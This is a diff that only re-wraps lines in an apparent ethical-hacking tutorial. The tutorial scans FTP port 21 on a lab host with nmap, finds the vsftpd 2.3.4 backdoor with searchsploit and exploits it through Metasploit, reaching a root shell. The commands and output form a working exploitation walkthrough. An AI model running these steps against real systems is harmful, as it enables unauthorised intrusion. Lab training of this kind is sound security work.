@@ -26,7 +26,8 @@ One of the popular tools hackers use to check if Port 21 is open on a target sys
 ```terminal
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -p21 192.168.11.135                            
-Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-10 09:13 EDT
+Starting Nmap 7.93 ( https://nmap.org ) at 
+2023-09-10 09:13 EDT
 Nmap scan report for 192.168.11.135
 Host is up (0.00099s latency).
 
@@ -48,7 +49,8 @@ To accomplish this, we can use `nmap` with the `-sV` flag. Here's how the comman
 ```terminal
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -sV -p21 192.168.11.135 
-Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-10 09:29 EDT
+Starting Nmap 7.93 ( https://nmap.org ) 
+at 2023-09-10 09:29 EDT
 Nmap scan report for 192.168.11.135
 Host is up (0.00046s latency).
 
@@ -69,7 +71,8 @@ Take a look at this Nmap scan result used with the `-sC` :
 
 ```terminal
 └─# nmap -sC -sV -p21 192.168.11.135
-Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-10 09:45 EDT
+Starting Nmap 7.93 ( https://nmap.org ) 
+at 2023-09-10 09:45 EDT
 Nmap scan report for 192.168.11.135
 Host is up (0.00045s latency).
 
@@ -173,11 +176,19 @@ Using that specific version i used:
 
 ```terminal
 └─# searchsploit vsftpd 2.3.4
--------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                        |  Path
--------------------------------------------------------------------------------------- ---------------------------------
-vsftpd 2.3.4 - Backdoor Command Execution                                             | unix/remote/49757.py
-vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                | unix/remote/17491.rb
+---------------------------------------
+------------
+-------------------
+---------------- ---------------------------------
+ Exploit Title                                                               
+          |  Path
+------------------------------------------
+-------------------------------------------
+- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                         
+    | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) 
+                               | unix/remote/17491.rb
 ```
 Here, we have a list of potential exploits associated with vsFTPd 2.3.4:
 - `vsftpd 2.3.4 - Backdoor Command Execution`: This exploit, identified by the path "unix/remote/49757.py," targets the FTP server's vulnerability, potentially allowing remote attackers to execute arbitrary commands.
@@ -206,27 +217,37 @@ msf6 > search vsftpd 2.3.4
 Matching Modules
 ================
 
-   #  Name                                  Disclosure Date  Rank       Check  Description
-   -  ----                                  ---------------  ----       -----  -----------
-   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+   #  Name                            
+         Disclosure Date  Rank       Check  Description
+
+   
+   -  ----                                  -------------
+   --  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03   
+       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 
 
-Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+Interact with a module by name or index. For example info 0,
+ use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 And here as you can see i found the exploit `vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)`. Now we are going to use it using the `use` command :
 ```terminal
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+use exploit/unix/ftp/vsftpd_234_backdoor
 [*] Using configured payload cmd/unix/interact
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.11.135
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+set rhosts 192.168.11.135
 rhosts => 192.168.11.135
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) 
+> exploit 
 
 [*] 192.168.11.135:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 192.168.11.135:21 - USER: 331 Please specify the password.
 [+] 192.168.11.135:21 - Backdoor service has been spawned, handling...
 [+] 192.168.11.135:21 - UID: uid=0(root) gid=0(root)
 [*] Found shell.
-[*] Command shell session 1 opened (192.168.11.128:33417 -> 192.168.11.135:6200) at 2023-09-10 11:21:23 -0400
+[*] Command shell session 1 opened (192.168.11.128:33417
+ -> 192.168.11.135:6200) at 2023-09-10 11:21:23 -0400
 ```
 Let's dive in our command :
 - `use exploit/unix/ftp/vsftpd_234_backdoor` We begin by specifying the exploit we want to use. In this case, we've chosen the "vsftpd_234_backdoor" exploit for vsFTPd 2.3.4.
@@ -237,7 +258,8 @@ Let's dive in our command :
 Having successfully exploited the vsFTPd vulnerability, we've achieved a significant milestone in ethical hacking: gaining root access to the target machine. This level of access grants us the highest privileges, essentially making us the system's administrator.
 ```terminal
 [*] Found shell.
-[*] Command shell session 1 opened (192.168.11.128:44003 -> 192.168.11.135:6200) at 2023-09-10 11:52:35 -0400
+[*] Command shell session 1 opened (192.168.11.128:44003 
+  -> 192.168.11.135:6200) at 2023-09-10 11:52:35 -0400
 
 id
 uid=0(root) gid=0(root)
